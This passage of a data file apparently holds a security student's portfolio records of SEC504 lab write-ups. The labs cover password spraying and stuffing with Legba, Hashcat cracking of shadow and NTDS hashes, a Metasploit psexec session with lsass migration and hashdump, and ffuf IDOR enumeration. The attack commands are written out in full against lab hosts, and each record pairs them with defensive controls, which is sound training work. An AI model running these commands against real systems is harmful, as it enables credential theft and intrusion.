        screenshot: "/labs/legba-115637.png",
      },
      {
        title: "Inspect the wordlists",
        description:
          "The lab provided a combo credentials.txt (user:pass pairs like administrator:password), 10k-most-common.txt, falsimentisusernames.txt, and passwords lists. The combo list is for stuffing; the username list plus a single password is for spraying.",
        command: "cd ~/labs/passwords/\nls -lah\nhead credentials.txt",
        commandBreakdown: "credentials.txt = combo list; falsimentisusernames.txt = spray user list",
        screenshot: "/labs/legba-120506.png",
      },
      {
        title: "Credential stuffing against HTTP Basic",
        description:
          "172.30.0.12 answered with a browser Basic-auth prompt. Legba with -C fed the combo list against the http.basic module. Despite canary-code warnings, it found admin:tiksight in 596 attempts at ~596 requests/sec, runtime 1.38s.",
        command: "legba -C credentials.txt -T http://172.30.0.12/ http.basic",
        commandBreakdown: "-C combo.txt: user:pass pairs\n-T: target\nhttp.basic: protocol module",
        screenshot: "/labs/legba-120614.png",
      },
      {
        title: "Validate and dictionary-attack MySQL",
        description:
          "First validated the found credential against MySQL on 172.30.0.64 with -U/-P single values. Then ran a real dictionary attack: -U root -P 10k-most-common.txt found root:changeme in 9,257 attempts at up to ~5,000 requests/sec (3.29s).",
        command: "legba -U admin -P tiksight -T 172.30.0.64 mysql\nlegba -U root -P 10k-most-common.txt -T 172.30.0.64 mysql",
        commandBreakdown: "-U user -P wordlist: single-user dictionary attack",
        screenshot: "/labs/legba-121048.png",
      },
      {
        title: "Password spraying against SMB",
        description:
          "Spraying inverts the flags: -U falsimentisusernames.txt with a single -P password tries one password across every user. -P Falsimentis123 found ttidmas; -P Falsimentis! found ptrouel. Because each account sees only one failed attempt, spraying stays under lockout thresholds that would stop a dictionary attack.",
        command: "legba -U falsimentisusernames.txt -P Falsimentis123 -T 172.30.0.155 smb\nlegba -U falsimentisusernames.txt -P 'Falsimentis!' -T 172.30.0.155 smb",
        commandBreakdown: "-U userlist + -P single = spray; one attempt per account evades lockout",
        screenshot: "/labs/legba-121553.png",
      },
    ],
    outcome:
      "Ran all three online password attacks with Legba and recovered credentials on each service: admin:tiksight (HTTP Basic, stuffing), root:changeme (MySQL, dictionary), and ttidmas/ptrouel (SMB, spray). The flag patterns made the taxonomy explicit: -C for stuffing, -U user -P list for dictionary, -U list -P single for spray.",
    nextStepsInProduction:
      "Detect spraying by correlating a low number of failures across many accounts in a short window, not just per-account thresholds, since spraying is designed to stay under lockout. Enforce MFA so a single valid password is not sufficient, and kill weak/default passwords (changeme, seasonal patterns) with a password filter and breached-password screening. Rate-limit and alert on HTTP Basic and SMB authentication failures, and disable HTTP Basic in favor of a real auth flow.",
    securityControlsRelevant: [
      "MFA to defeat single-credential compromise",
      "Spray detection (failures spread across many accounts)",
      "Breached-password and weak-password screening",
      "Authentication rate limiting on HTTP Basic, MySQL, SMB",
      "Account lockout tuned against spray, not just brute force",
    ],
    keyFindings: [
      "Credential stuffing found admin:tiksight over HTTP Basic in 596 attempts (1.38s)",
      "Dictionary attack found root:changeme over MySQL from the 10k-common list",
      "Password spraying found ttidmas:Falsimentis123 and ptrouel:Falsimentis! over SMB",
      "Spray's one-attempt-per-account shape evades lockout that stops dictionary attacks",
    ],
    takeaway: [
      "Spraying is the attack worth internalizing. A dictionary attack hammers one account and trips lockout; a spray tries one password across hundreds of accounts and each one sees a single failure, so nothing locks. That is why real intrusions start with a spray of a common seasonal password: it is quiet, it beats lockout, and it only needs to work once. Per-account thresholds do not catch it; cross-account correlation does.",
      "The three attacks look different in the logs, and that is the defensive hook. Stuffing and dictionary concentrate failures on one identity; spraying spreads a handful of failures across many. A detection tuned only for repeated failures on a single account is blind to the exact attack most likely to succeed. Legba makes this concrete because the same tool, with three flag patterns, produces three distinct log signatures.",
    ],
    screenshots: [
      { src: "/labs/legba-115637.png", alt: "nmap subnet map", caption: "Five hosts: HTTP (.12/.35), MySQL (.64), SMB (.155), SSH+HTTP (.185)" },
      { src: "/labs/legba-120220.png", alt: "HTTP Basic auth prompt", caption: "172.30.0.12 presents a browser Basic-auth challenge" },
      { src: "/labs/legba-120506.png", alt: "Credential wordlists", caption: "credentials.txt combo list plus username and password lists" },
      { src: "/labs/legba-120614.png", alt: "Credential stuffing result", caption: "legba -C found admin:tiksight in 596 attempts (1.38s)" },
      { src: "/labs/legba-120751.png", alt: "Credential validation vs MySQL", caption: "Validating the found credential against MySQL" },
      { src: "/labs/legba-121048.png", alt: "Dictionary attack vs MySQL", caption: "legba -U root -P 10k-most-common found root:changeme" },
      { src: "/labs/legba-121553.png", alt: "Password spray vs SMB", caption: "legba -U userlist -P Falsimentis123 found ttidmas over SMB" },
      { src: "/labs/legba-121653.png", alt: "Second spray pass", caption: "-P 'Falsimentis!' found ptrouel; spray stays under lockout" },
    ],
  },
  {
    id: 31,
    courseSlug: "sec504",
    slug: "offline-password-cracking-hashcat",
    title: "Offline Password Cracking with Hashcat: Shadow Files and Active Directory NTDS",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Password Management & Cryptography",
    level: "SEC504",
    date: "Aug 2026",
    artifacts: "Sanitized Hashcat output against Linux shadow hashes and an extracted Active Directory NTDS.dit from the SEC504 lab (CPU-only)",
    context:
      "This lab works the Hashcat attack-mode ladder against two real hash sources: Linux shadow-file hashes and an Active Directory NTDS.dit dumped with secretsdump.py. It moves from identifying hash types, through a straight dictionary attack, to a mask attack against a known password pattern, to a rule-based attack, and shows why rules give the best value per second. All CPU-only, which makes the speed differences between attack modes obvious.",
    summary:
      "Identified Linux hashes with hashcat --identify (descrypt 1500, md5crypt 500, sha256/512crypt), then cracked them with a dictionary attack, recovering beva:Spring23, jorestes:Qwertyu1, and hrio:12345678, using --show --username to display results and --left to list what remained. For the AD side, secretsdump.py extracted NTDS.dit; awk revealed all 2,258 accounts shared the empty LM hash (aad3b435b51404eeaad3b435b51404ee), and sed stripped machine accounts. A dictionary attack against the NTLM hashes recovered 46/1,845 (Password1-4, Welcome1, seasonal patterns). A mask attack (?u?l?l?l?l?l?l?d) pushed it to 95/1,845, and a best64 rule attack reached 105/1,845 in four seconds, beating the six-minute mask run.",
    whyThisMatters:
      "Offline cracking is what happens after a hash dump, and the results here are a direct readout of password policy: the cracked passwords were seasonal patterns and Password1 through Password4, which no wordlist invents, they exist because policy allowed them. The attack-mode ladder matters because rules turned 44,488 words into 3.4 million candidates in four seconds and out-cracked a mask attack that ran for six minutes. For a defender, the lesson is that the crack rate is set by your password policy, not by the attacker's wordlist.",
    tldr: [
      "hashcat --identify plus the attack-mode ladder cracked Linux shadow and Active Directory NTLM hashes",
      "All 2,258 AD accounts shared the empty LM hash; cracked NTLM passwords were Password1-4 and seasonal patterns",
      "A best64 rule attack cracked 105/1,845 in 4 seconds, beating a 6-minute mask run: rules give the best value",
    ],
    skillsDemonstrated: [
      "Hash identification (hashcat --identify, autodetect)",
      "Dictionary, mask, and rule-based attack modes (-a 0/-a 3/-r)",
      "NTDS.dit extraction with secretsdump.py",
      "Result management (--show, --left, --username)",
      "Reading crack results as a password-policy audit",
    ],
    tools: ["Hashcat 6.2.5", "secretsdump.py (Impacket)", "awk", "sed", "Slingshot Linux"],
    steps: [
      "Identify the Linux shadow hash types",
      "Run a dictionary attack and show cracked results with usernames",
      "List the hashes that remain uncracked",
      "Extract NTLM hashes from NTDS.dit with secretsdump.py",
      "Analyze the LM hashes and strip machine accounts",
      "Dictionary-attack the NTLM hashes",
      "Escalate with a mask attack, then a rule-based attack",
    ],
    stepDetails: [
      {
        title: "Identify the hash types",
        description:
          "hashcat --identify returned four candidate modes for the shadow file (descrypt 1500, md5crypt 500, sha256crypt 7400, sha512crypt 1800). The /etc/passwd-style lines throw a token-length exception, which is expected: those lines have no crackable hash.",
        command: "hashcat slingshot.hashes --identify",
        commandBreakdown: "--identify: list candidate -m modes for the input",
        screenshot: "/labs/hashcat-201301.png",
      },
      {
        title: "Dictionary attack and show results",
        description:
          "A straight dictionary attack (-a 0 -m 1500) against the descrypt hashes, then --show --username to display the cracked pairs: beva:Spring23, jorestes:Qwertyu1, hrio:12345678. --show reads the potfile so results survive between runs.",
        command: "hashcat -a 0 -m 1500 slingshot.hashes /usr/share/wordlists/passwords.txt\nhashcat -m 1500 slingshot.hashes --show --username",
        commandBreakdown: "-a 0: dictionary\n--show: print cracked from potfile\n--username: include the account",
        screenshot: "/labs/hashcat-201712.png",
      },
      {
        title: "List what remains",
        description:
          "--left prints the hashes still uncracked (lrenate, rkaede, asayaka, alucasta), which tells you exactly where to point the next, more expensive attack instead of re-running the whole set.",
        command: "hashcat -m 1500 slingshot.hashes --left --username",
        commandBreakdown: "--left: show hashes not yet in the potfile",
        screenshot: "/labs/hashcat-201801.png",
      },
      {
        title: "Extract NTLM hashes from NTDS.dit",
        description:
          "secretsdump.py parsed the extracted Active Directory database and SYSTEM hive locally, writing NTLM hashes (with history). This is the offline-cracking input that matters most in a domain compromise: every account's password hash in one file.",
        command: "secretsdump.py -system registry/SYSTEM -ntds \"Active Directory/ntds.dit\" LOCAL -outputfile w99 -history",
        commandBreakdown: "LOCAL: parse offline files\n-history: include password history",
        screenshot: "/labs/hashcat-202411.png",
      },
      {
        title: "Analyze LM hashes and strip machine accounts",
        description:
          "awk on the LM-hash column showed all 2,258 accounts share aad3b435b51404eeaad3b435b51404ee, the empty LM hash, which means LM is disabled (good). sed then stripped machine accounts (names ending in $) so the crack focuses on user passwords.",
        command: "cat w99.ntds | awk -F: '{print $3}' | sort | uniq -c\nsed -i '/\\$/d' w99.ntds",
        commandBreakdown: "awk $3: the LM hash column\nsed '/$/d': drop machine accounts",
        screenshot: "/labs/hashcat-202544.png",
      },
      {
        title: "Dictionary, then mask, then rules",
        description:
          "Autodetect resolved the hashes as NTLM (mode 1000). A dictionary attack cracked 46/1,845 (Password1-4, Welcome1, seasonal). A mask attack (?u?l?l?l?l?l?l?d, an 8-char Upper+6lower+digit pattern) reached 95/1,845 but took six minutes. A best64 rule attack cracked 105/1,845 in four seconds, expanding 44,488 words into 3.4 million candidates. Rules gave the best value by a wide margin.",
        command: "hashcat -a 0 w99.ntds /usr/share/wordlists/passwords.txt\nhashcat -a 3 w99.ntds ?u?l?l?l?l?l?l?d\nhashcat -a 0 w99.ntds /usr/share/wordlists/passwords.txt -r /opt/hashcat/rules/best64.rule",
        commandBreakdown: "-a 0 dictionary\n-a 3 mask (?u upper ?l lower ?d digit)\n-r rules: mangle each word",
        screenshot: "/labs/hashcat-203823.png",
      },
    ],
    outcome:
      "Cracked Linux shadow hashes and Active Directory NTLM hashes with the full Hashcat attack-mode ladder. The AD results were a password-policy readout: Password1 through Password4, Welcome1, and seasonal patterns. A best64 rule attack cracked 105/1,845 hashes in four seconds, out-performing a six-minute mask run.",
    nextStepsInProduction:
      "Treat the crack results as a policy audit: ban Password1-style and seasonal patterns with a password filter and screen against breached-password lists, because those are what cracked. Enforce length over complexity (passphrases resist dictionary+rule attacks far better than 8-char patterns), and deploy MFA so a cracked hash is not game over. Confirm LM is disabled everywhere (the empty LM hash here shows it was) and protect NTDS.dit and the SYSTEM hive as the crown-jewel files they are.",
    securityControlsRelevant: [
      "Password filters banning seasonal and Password<N> patterns",
      "Breached-password screening",
      "Length-based policy (passphrases) over 8-char complexity",
      "MFA to blunt cracked-credential impact",
      "NTDS.dit / SYSTEM hive protection and access monitoring",
    ],
    keyFindings: [
      "All 2,258 AD accounts shared the empty LM hash (aad3b435b51404eeaad3b435b51404ee): LM disabled",
      "Dictionary attack cracked 46/1,845 NTLM: Password1-4, Welcome1, seasonal patterns",
      "Mask attack (?u?l?l?l?l?l?l?d) reached 95/1,845 in ~6 minutes",
      "best64 rule attack reached 105/1,845 in 4 seconds (44,488 words -> 3.4M candidates)",
      "Cracked passwords were policy artifacts, not wordlist inventions",
    ],
    takeaway: [
      "The crack rate is a readout of your password policy, not the attacker's skill. Password1 through Password4 and Autumn2020 are not in any clever wordlist by accident, they are there because rules generate exactly the patterns that a complexity policy permits and users reach for. If those crack, the fix is a password filter and length requirements, not a better firewall.",
      "The attack-mode ladder has a clear winner. A dictionary attack is cheap but shallow; a mask attack is precise but slow when you guess the pattern; rules are the sweet spot, turning 44,488 words into 3.4 million candidates in four seconds and out-cracking a six-minute mask run. Understanding that ordering is what lets an analyst estimate how exposed a given hash set really is, and how fast.",
    ],
    screenshots: [
      { src: "/labs/hashcat-201301.png", alt: "hashcat --identify", caption: "Four candidate modes for the shadow file (descrypt, md5crypt, sha256/512crypt)" },
      { src: "/labs/hashcat-201509.png", alt: "Dictionary attack start", caption: "hashcat -a 0 -m 1500 against the shadow hashes (CPU-only)" },
      { src: "/labs/hashcat-201610.png", alt: "Cracked shadow passwords", caption: "Spring23, Qwertyu1, 12345678 recovered" },
      { src: "/labs/hashcat-201712.png", alt: "--show --username", caption: "beva:Spring23, jorestes:Qwertyu1, hrio:12345678" },
      { src: "/labs/hashcat-201801.png", alt: "--left uncracked", caption: "Remaining uncracked hashes to target next" },
      { src: "/labs/hashcat-201948.png", alt: "md5crypt dictionary run", caption: "md5crypt (-m 500): 3/6 recovered, Status Exhausted" },
      { src: "/labs/hashcat-202411.png", alt: "secretsdump.py NTDS", caption: "secretsdump.py extracts NTLM hashes from NTDS.dit" },
      { src: "/labs/hashcat-202544.png", alt: "LM hash analysis", caption: "All 2,258 accounts share the empty LM hash aad3b435b51404ee..." },
      { src: "/labs/hashcat-202647.png", alt: "Strip machine accounts", caption: "sed -i '/$/d' removes machine accounts (names end in $)" },
      { src: "/labs/hashcat-203402.png", alt: "NTLM autodetect", caption: "Autodetect resolves the hashes as mode 1000 (NTLM)" },
      { src: "/labs/hashcat-203417.png", alt: "Dictionary crack of NTLM", caption: "46/1,845 cracked: Password1-4, Welcome1, seasonal patterns" },
      { src: "/labs/hashcat-203638.png", alt: "Mask attack progress", caption: "Mask ?u?l?l?l?l?l?l?d reaches 95/1,845 in ~6 minutes" },
      { src: "/labs/hashcat-203823.png", alt: "Rule-based attack", caption: "best64 rules: 105/1,845 in 4 seconds, 3.4M candidates" },
    ],
  },
  {
    id: 32,
    courseSlug: "sec504",
    slug: "post-exploitation-metasploit-meterpreter",
    title: "Post-Exploitation with Metasploit and Meterpreter",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Incident Response",
    level: "SEC504",
    date: "Aug 2026",
    artifacts: "Sanitized msfconsole and Meterpreter session output from the SEC504 lab against a Windows 10 target",
    context:
      "This lab runs the full Metasploit workflow against a Windows target using psexec: search for a module, configure it, get a session, and then work post-exploitation inside Meterpreter (situational awareness, process migration, and credential dumping). The key framing is that psexec is authenticated code execution, valid credentials are the exploit, which is why it matters so much that credentials leak in the earlier labs.",
    summary:
      "In msfconsole (v6.4.74), searched for psexec modules and selected exploit/windows/smb/psexec. Set RHOSTS, SMBUser, SMBPass, and LHOST, and ran it: authenticated as sec504, executed the payload, and opened Meterpreter session 1 as NT AUTHORITY\\SYSTEM on SEC504STUDENT. Backgrounded and re-entered the session, then ran post-exploitation: sysinfo and systeminfo for host detail, getuid confirming SYSTEM, ps for the process list, getpid showing the current PID (6056), and migrate -N lsass.exe to move into a stable, always-running process (which also switched the session to x64). Finished with hashdump, recovering the local SAM NTLM hashes including the empty-password hash on the built-in accounts.",
    whyThisMatters:
      "psexec is not a memory-corruption exploit; it is authenticated user code execution, which means the valid credentials recovered in the SMB and password labs are the exploit. Process migration into lsass.exe is the move that makes a session survive and matches the target architecture, and hashdump is how one compromised host becomes credentials for the next. Understanding this chain from the defender's side is what connects a leaked password to full domain-adjacent compromise.",
    tldr: [
      "psexec is authenticated code execution: valid credentials are the exploit, opening a SYSTEM Meterpreter session",
      "migrate -N lsass.exe moved into a stable process and switched the session to x64",
      "hashdump recovered local NTLM hashes, turning one compromised host into credentials for the next",
    ],
    skillsDemonstrated: [
      "Metasploit module search, selection, and configuration",
      "Credentialed exploitation with psexec",
      "Meterpreter session management (background, sessions, interact)",
      "Post-exploitation situational awareness (sysinfo, ps, getuid)",
      "Process migration and credential dumping (hashdump)",
    ],
    tools: ["Metasploit 6.4.74", "Meterpreter", "psexec", "Windows 10", "Slingshot Linux"],
    steps: [
      "Search for psexec modules and read the module info",
      "Select the module and set RHOSTS, SMBUser, SMBPass, LHOST",
      "Run the exploit and open a Meterpreter session",
      "Background and re-enter the session; confirm SYSTEM",
      "Gather host detail with sysinfo and systeminfo",
      "List processes and migrate into lsass.exe",
      "Dump local credentials with hashdump",
    ],
    stepDetails: [
      {
        title: "Search and select the module",
        description:
          "search type:exploit psexec listed the psexec family, including smb_relay (MS08-068), ms17_010_psexec (EternalBlue and friends), and the plain smb/psexec authenticated module. info showed it is Privileged: Yes, Rank: Manual, and offers PowerShell/Native/MOF/Command targets. This is authenticated code execution, not a CVE exploit.",
        command: "search type:exploit psexec\nuse exploit/windows/smb/psexec\ninfo",
        commandBreakdown: "type:exploit filters the search; info shows options and targets",
        screenshot: "/labs/metasploit-205613.png",
      },
      {
        title: "Configure and run",
        description:
          "Set RHOSTS (the target), SMBUser/SMBPass (the credentials, which are the actual exploit), and LHOST (the callback). exploit authenticated as sec504, selected the PowerShell target, and sent the payload.",
        command: "set RHOSTS 10.10.0.1\nset SMBUser sec504\nset SMBPass sec504\nset LHOST 10.10.75.1\nexploit",
        commandBreakdown: "SMBUser/SMBPass = the credentials that make psexec work",
        screenshot: "/labs/metasploit-210313.png",
      },
      {
        title: "Confirm the session and SYSTEM",
        description:
          "The exploit opened Meterpreter session 1. background dropped back to the console; sessions listed it as NT AUTHORITY\\SYSTEM @ SEC504STUDENT; sessions 1 re-entered it. sysinfo confirmed Windows 10 21H2 in the SEC504 domain. Sessions are backgroundable and re-enterable, which is how an operator juggles multiple hosts.",
        command: "background\nsessions\nsessions 1\nsysinfo",
        commandBreakdown: "background/sessions/interact: session management; already SYSTEM",
        screenshot: "/labs/metasploit-210458.png",
      },
      {
        title: "Situational awareness",
        description:
          "execute -if systeminfo pulled full host detail (VMware, patch level, 6 hotfixes). getuid confirmed NT AUTHORITY\\SYSTEM. ps listed every process with PID, PPID, user, and path, which is what you read before deciding where to migrate.",
        command: "execute -if systeminfo\ngetuid\nps\ngetpid",
        commandBreakdown: "getuid: current context\nps: process list for a migration target",
        screenshot: "/labs/metasploit-210728.png",
      },
      {
        title: "Migrate into lsass.exe",
        description:
          "The initial session was x86 with PID 6056. migrate -N lsass.exe moved into the LSASS process; sysinfo afterward reported x64/windows. Migration does two things: it hides the session inside a critical always-running process, and it matches the host architecture so 64-bit post-exploitation tooling works.",
        command: "getpid\nmigrate -N lsass.exe\nsysinfo",
        commandBreakdown: "-N <name>: migrate by process name; also fixes x86 -> x64",
        screenshot: "/labs/metasploit-210938.png",
      },
      {
        title: "Dump local credentials",
        description:
          "hashdump read the local SAM: Administrator, DefaultAccount, Guest (all showing the empty-password NTLM hash 31d6cfe0...), plus the Sec504 and WDAGUtilityAccount hashes. This is how a single host compromise becomes credentials to attack the next one.",
        command: "hashdump",
        commandBreakdown: "31d6cfe0d16ae931b73c59d7e0c089c0 = empty-password NTLM hash",
        screenshot: "/labs/metasploit-211023.png",
      },
    ],
    outcome:
      "Ran the full Metasploit-to-Meterpreter workflow: selected psexec, authenticated with valid credentials, opened a SYSTEM session, gathered situational awareness, migrated into lsass.exe (moving to x64 and a stable process), and dumped local NTLM hashes. Every step reinforced that credentials, not a CVE, were the exploit.",
    nextStepsInProduction:
      "Because psexec relies on valid admin credentials over SMB, the defenses are credential-centric: enforce LAPS so local admin passwords are unique per host (preventing pass-the-hash reuse), restrict which accounts can authenticate over SMB to which hosts, and enable Credential Guard to protect LSASS from hashdump. Alert on service creation via SMB (the psexec technique), on remote 4624/4672 logons by admin accounts, and on process access to lsass.exe.",
    securityControlsRelevant: [
      "LAPS (unique local admin passwords) to stop hash reuse",
      "Credential Guard / LSASS protection against hashdump",
      "Restricting SMB admin authentication by account and host",
      "Detection of remote service creation (psexec technique)",
      "Alerting on lsass.exe process access and remote admin logons",
    ],
    keyFindings: [
      "psexec opened a session as NT AUTHORITY\\SYSTEM using valid credentials, not an exploit",
      "Meterpreter sessions are backgroundable and re-enterable by ID",
      "migrate -N lsass.exe moved into a stable process and switched the session to x64",
      "hashdump recovered local NTLM hashes incl. the empty-password hash 31d6cfe0...",
    ],
    takeaway: [
      "psexec reframes what an exploit is. There is no CVE here, no memory corruption; the module authenticates with a username and password and runs code because that is what those credentials are allowed to do. This is exactly why the earlier credential-leak labs matter: a password found in an SMB share or cracked from a hash dump is a working exploit against every host that trusts it. The vulnerability is credential reuse, not a patchable bug.",
      "Migration into lsass.exe is the quiet, important move. It hides the session inside a process that can never be killed without crashing the host, and it aligns the session architecture with the target so full tooling works. For a defender, process access to lsass is a high-value detection: it is both where attackers hide and where they dump credentials, so monitoring it catches two techniques at once.",
    ],
    screenshots: [
      { src: "/labs/metasploit-205447.png", alt: "msfconsole banner", caption: "Metasploit 6.4.74 with 2,533 exploits loaded" },
      { src: "/labs/metasploit-205613.png", alt: "search psexec", caption: "psexec module family: smb_relay, ms17_010, plain smb/psexec" },
      { src: "/labs/metasploit-205806.png", alt: "module info", caption: "smb/psexec: Privileged Yes, authenticated user code execution" },
      { src: "/labs/metasploit-205918.png", alt: "select module + payload", caption: "use exploit/windows/smb/psexec; default meterpreter/reverse_tcp" },
      { src: "/labs/metasploit-210313.png", alt: "configure and exploit", caption: "RHOSTS/SMBUser/SMBPass/LHOST set; session opens" },
      { src: "/labs/metasploit-210458.png", alt: "SYSTEM session", caption: "sessions: NT AUTHORITY\\SYSTEM @ SEC504STUDENT" },
      { src: "/labs/metasploit-210628.png", alt: "systeminfo", caption: "Full host detail via execute -if systeminfo" },
      { src: "/labs/metasploit-210642.png", alt: "getuid", caption: "Server username: NT AUTHORITY\\SYSTEM" },
      { src: "/labs/metasploit-210728.png", alt: "process list", caption: "ps: PID/PPID/user/path for choosing a migration target" },
      { src: "/labs/metasploit-210938.png", alt: "migrate to lsass", caption: "migrate -N lsass.exe; session becomes x64/windows" },
      { src: "/labs/metasploit-211023.png", alt: "hashdump", caption: "Local SAM NTLM hashes incl. empty-password 31d6cfe0..." },
    ],
  },
  {
    id: 33,
    courseSlug: "sec504",
    slug: "idor-forced-browsing",
    title: "IDOR and Forced Browsing: Enumerating Objects Nobody Should Reach",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Web Application Security",
    level: "SEC504",
    date: "Jul 2026",
    artifacts: "Sanitized ffuf, curl, and browser output from the SEC504 web lab against support.falsimentis.com",
    context:
      "This lab chains forced browsing (content discovery with ffuf) into an insecure direct object reference: a chatbot saves conversation logs to predictable, sequentially numbered files with no authentication, so enumerating the IDs exposes every user's transcript. It is a clean demonstration of two of the most common web findings, and how one feeds the other.",
    summary:
      "Started with robots.txt, which named /admin and /singlestatus as disallowed (a map of what to look at, not a control). ffuf with a large wordlist discovered admin, chat, contact, kb, status, and a builds path that returned a directory listing exposing a full Docker build log (installed packages, base image, build stages). The chatbot at /chat saved transcripts on the 'save' command to /chatlogs/chatlog-<id>.txt with a predictable four-digit ID and no auth. Enumerating IDs with seq piped into ffuf, filtering out the baseline 500 error (-fc 500), found live logs at 2305, 5492, 7127, 7341, and 9653, each another user's full conversation, in 10,000 requests over five seconds.",
    whyThisMatters:
      "IDOR is consistently near the top of real-world web findings because it needs no exploit, just a predictable identifier and a missing authorization check. Here a four-digit sequential ID plus no ownership check meant 10,000 requests, five seconds, and every user's chat log. This is the exact class of bug I hunt for in AppSec reviews: the object reference is right there in the URL, and the only thing standing between a user and someone else's data is a server-side check the developer forgot to write.",
    tldr: [
      "ffuf content discovery found a /builds directory listing leaking a full Docker build log",
      "A chatbot saved transcripts to predictable /chatlogs/chatlog-<id>.txt files with no authorization check",
      "seq + ffuf -fc 500 enumerated 10,000 IDs in five seconds and pulled every user's chat log (IDOR)",
    ],
    skillsDemonstrated: [
      "Forced browsing / content discovery with ffuf",
      "Reading robots.txt as an attack map",
      "Directory-listing and build-artifact analysis",
      "IDOR identification and object enumeration",
      "Response-code filtering to separate hits from noise (-fc)",
    ],
    tools: ["ffuf 2.1.0", "curl", "seq", "Firefox", "Slingshot Linux"],
    steps: [
      "Read robots.txt for disallowed paths",
      "Discover content with ffuf and a large wordlist",
      "Investigate the builds directory listing and build log",
      "Trigger the chatbot's save function and find the log file",
      "Enumerate log IDs with seq + ffuf, filtering the baseline error",
      "Retrieve another user's chat log to confirm the IDOR",
    ],
    stepDetails: [
      {
        title: "Read robots.txt",
        description:
          "curl on robots.txt showed AI-crawler blocks and, for all agents, Disallow: /admin and Disallow: /singlestatus. robots.txt does not protect anything; it is a list of the paths the site most wants hidden, which makes it the first place to look.",
        command: "curl http://support.falsimentis.com/robots.txt",
        commandBreakdown: "Disallow entries are a map of sensitive paths, not access control",
        screenshot: "/labs/idor-135313.png",
      },
      {
        title: "Discover content with ffuf",
        description:
          "ffuf fuzzed the URL path with a 128k-word list at ~2,200 requests/sec. Hits: admin, chat, contact, kb, status (all 200), and builds (302). The FUZZ keyword marks where each wordlist entry is substituted.",
        command: "ffuf -w combined_words.txt -u http://support.falsimentis.com/FUZZ",
        commandBreakdown: "FUZZ: injection point\nDefault status matcher catches 200/301/302/401/403",
        screenshot: "/labs/idor-141203.png",
      },
      {
        title: "Investigate the builds directory listing",
        description:
          "curl -v on /builds/ returned an 'Index of /builds' directory listing exposing build.log (80 KB) and build.log.old. Reading build.log leaked the entire Docker build: python:3.7-slim base, installed packages (including fping and netcat, relevant to the sibling command-injection lab), and every build stage.",
        command: "curl -v http://support.falsimentis.com/builds/\ncurl -v http://support.falsimentis.com/builds/build.log",
        commandBreakdown: "Directory listing + build log leak internal implementation detail",
        screenshot: "/labs/idor-141654.png",
      },
      {
        title: "Trigger the chatbot save",
        description:
          "The /chat bot offered a 'save' command. Typing save returned 'Chat history saved!' and wrote the transcript to /chatlogs/chatlog-7341.txt. curling that file returned the transcript: a predictable four-digit ID, served with no authentication.",
        command: "# in the chat UI: type 'save'\ncurl http://support.falsimentis.com/chatlogs/chatlog-7341.txt",
        commandBreakdown: "Predictable 4-digit ID + no auth = the IDOR precondition",
        screenshot: "/labs/idor-142327.png",
      },
      {
        title: "Enumerate the log IDs",
        description:
          "seq generated IDs piped into ffuf as a stdin wordlist. The first pass showed every nonexistent ID returned 500, so -fc 500 filtered that baseline out. Sweeping 0-9999 found live logs at 2305, 5492, 7127, 7341, and 9653 in 10,000 requests over five seconds.",
        command: "seq -w 0 9999 | ffuf -w - -u http://support.falsimentis.com/chatlogs/chatlog-FUZZ.txt -fc 500",
        commandBreakdown: "-w -: read wordlist from stdin\n-fc 500: filter the baseline error code",
        screenshot: "/labs/idor-142817.png",
      },
      {
        title: "Retrieve another user's log",
        description:
          "curling chatlog-2305.txt returned a complete conversation belonging to a different user. No credentials, no session, no ownership check: a predictable ID was the only thing between an anonymous request and another user's data. That is IDOR.",
        command: "curl http://support.falsimentis.com/chatlogs/chatlog-2305.txt",
        commandBreakdown: "Direct object reference with no server-side authorization",
        screenshot: "/labs/idor-142924.png",
      },
    ],
    outcome:
      "Chained forced browsing into an IDOR: ffuf discovered a directory listing leaking a Docker build log, and the chatbot's predictable, unauthenticated log filenames let a 10,000-request sweep pull every user's transcript in five seconds. Two of the most common web findings, one feeding the other.",
    nextStepsInProduction:
      "Add a server-side authorization check on every object access so a user can only retrieve logs they own, and replace sequential IDs with unguessable identifiers (UUIDs) as defense in depth. Disable directory listing and move build artifacts out of the web root. Rate-limit and alert on high-volume 404/500 sweeps against a single path, which is the enumeration signature. Do not rely on robots.txt for anything but crawler hints.",
    securityControlsRelevant: [
      "Server-side authorization on every direct object reference",
      "Unguessable identifiers (UUIDs) instead of sequential IDs",
      "Directory-listing disabled; artifacts out of web root",
      "Rate limiting and enumeration detection",
      "Not treating robots.txt as access control",
    ],
    keyFindings: [
      "robots.txt disclosed /admin and /singlestatus as sensitive paths",
      "/builds directory listing leaked a full Docker build log",
      "Chatbot saved transcripts to predictable /chatlogs/chatlog-<id>.txt with no auth",
      "seq + ffuf -fc 500 enumerated 10,000 IDs in 5 seconds, exposing 5 users' logs",
    ],
    takeaway: [
      "IDOR is the finding I look for first in a review because it is common, high-impact, and needs no exploit. The whole vulnerability is a reference in the URL plus a missing check on the server. Here the reference was a four-digit number and the missing check was ownership, so anyone could read anyone's chat log. The fix is one authorization check per object access, and the fact that it is so often skipped is exactly why IDOR keeps topping the findings lists.",
      "The enumeration technique is worth keeping. seq feeding ffuf on stdin, with -fc filtering the baseline error, turns 'is this ID valid?' into a five-second sweep of ten thousand possibilities. Sequential identifiers make it trivial; unguessable IDs make it impractical. That single design choice, UUID versus auto-increment, is the difference between a bug that is instantly enumerable and one that is not, which is why it belongs in the threat model of any object-reference endpoint.",
    ],
    screenshots: [
      { src: "/labs/idor-135313.png", alt: "robots.txt", caption: "robots.txt discloses /admin and /singlestatus" },
      { src: "/labs/idor-135819.png", alt: "wordlists", caption: "Forced-browsing wordlists in ~/labs/forcedbrowsing" },
      { src: "/labs/idor-140221.png", alt: "ffuf wellknown", caption: "First ffuf pass with the small wordlist" },
      { src: "/labs/idor-141203.png", alt: "ffuf content discovery", caption: "ffuf finds admin, chat, contact, kb, status, builds" },
      { src: "/labs/idor-141414.png", alt: "builds directory listing", caption: "'Index of /builds' exposes build.log and build.log.old" },
      { src: "/labs/idor-141654.png", alt: "Docker build log", caption: "build.log leaks base image, packages (fping, netcat), build stages" },
      { src: "/labs/idor-142315.png", alt: "chatbot save", caption: "The /chat bot saves transcripts on the 'save' command" },
      { src: "/labs/idor-142327.png", alt: "own chat log", caption: "chatlog-7341.txt: predictable 4-digit ID, no auth" },
